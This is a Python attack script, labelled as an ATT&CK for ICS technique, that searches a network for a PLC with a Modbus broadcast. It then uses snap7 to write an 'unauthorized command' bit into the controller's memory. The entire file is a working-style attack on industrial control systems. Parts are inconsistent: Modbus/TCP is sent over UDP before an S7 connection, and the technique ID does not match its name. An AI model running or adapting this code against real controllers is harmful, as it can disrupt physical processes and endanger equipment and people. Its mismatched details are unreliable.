# MITRE ATT&CK Technique T0864.001: Impair Process Control - Unauthorized Command Message

import snap7
import socket
import struct
import time

# Configuration - Adjust these based on your network and PLC setup
# PLC IP address (will be discovered if set to None)
PLC_IP = None  # Set to None for automatic discovery
PLC_RACK = 0
PLC_SLOT = 1
COMMAND_ADDRESS = 0  # Example: MB0, adjusts based on your program
COMMAND_BIT = 0      # Example: Bit 0 of MB0
UNAUTHORIZED_COMMAND_VALUE = True  # Set to True to activate, False to deactivate
SCAN_TIMEOUT = 5
SCAN_PORT = 2000
STOP_IP_ADDRESS = "0.0.0.0"

def find_plc_ip(scan_timeout=SCAN_TIMEOUT, scan_port=SCAN_PORT):
    """
    Scans the network for a Modbus TCP server (assumes it's the PLC).
    This is a basic discovery and might not work in all network configurations.
    If fails returns None.
    """
    print("[*] Attempting to discover PLC IP address...")
    try:
        # Create a UDP socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(scan_timeout)  # Set a timeout for the scan

        # Bind to all interfaces and a specific port
        sock.bind((STOP_IP_ADDRESS, scan_port))

        # Construct a simple Modbus/TCP query (Function Code 0x04: Read Input Registers)
        transaction_id = b'\x00\x01'
        protocol_id = b'\x00\x00'
        length = b'\x00\x06'  # Length of the remaining fields
        unit_id = b'\x01'  # Modbus unit identifier (slave address, often 1)
        function_code = b'\x04'  # Read Input Registers
        starting_address = b'\x00\x00'
        quantity_of_inputs = b'\x00\x01'  # Read only one input register

        request = transaction_id + protocol_id + length + unit_id + function_code + starting_address + quantity_of_inputs

        # Broadcast the request to the network (adjust broadcast address if needed)
        sock.sendto(request, ('<broadcast>', 502))  # Modbus/TCP default port is 502

        print("[*] Sending Modbus/TCP discovery broadcast...")

        # Listen for responses
        data, addr = sock.recvfrom(1024)
        print("[+] Received response from:", addr)
        print("[+] PLC IP Address: ", addr[0])
        return addr[0]
    except socket.timeout:
        print("[-] No PLC found within the specified timeout.")
        return None
    except Exception as e:
        print(f"[-] Error during PLC discovery: {e}")
        return None
    finally:
        sock.close()

def write_command_to_plc(plc_ip, rack, slot, address, bit, value):
    """
    Connects to the PLC and writes the unauthorized command.
    """
    try:
        plc = snap7.client.Client()
        plc.connect(plc_ip, rack, slot)

        # Read the byte containing the bit we want to change
        byte_address = address
        read_result = plc.read_area(snap7.client.Areas.MK, 0, byte_address, 1)  # Read 1 byte

        # Check if read_result is valid
        if not read_result:
            raise Exception("Failed to read data from PLC.")

        current_byte = read_result[0]  # Get the first (and only) byte

        # Modify the specific bit within the byte
        if value:
            new_byte = current_byte | (1 << bit)  # Set the bit
        else:
            new_byte = current_byte & ~(1 << bit)  # Clear the bit

        # Prepare the data to write back to the PLC
        data_to_write = bytes([new_byte])

        # Write the modified byte back to the PLC
        plc.write_area(snap7.client.Areas.MK, 0, byte_address, data_to_write)

        print(f"[+] Successfully wrote value {value} to MB{address}.{bit} on PLC {plc_ip}")

    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        if 'plc' in locals() and plc.get_connected():
            plc.disconnect()
            print("[-] Disconnected from PLC.")



if __name__ == "__main__":
    if PLC_IP is None:
        PLC_IP = find_plc_ip()
        if PLC_IP is None:
            print("[-] PLC IP address not found.  Please specify the PLC_IP or check your network.")
            exit(1)

    print(f"[*] Using PLC IP Address: {PLC_IP}")
    write_command_to_plc(PLC_IP, PLC_RACK, PLC_SLOT, COMMAND_ADDRESS, COMMAND_BIT, UNAUTHORIZED_COMMAND_VALUE)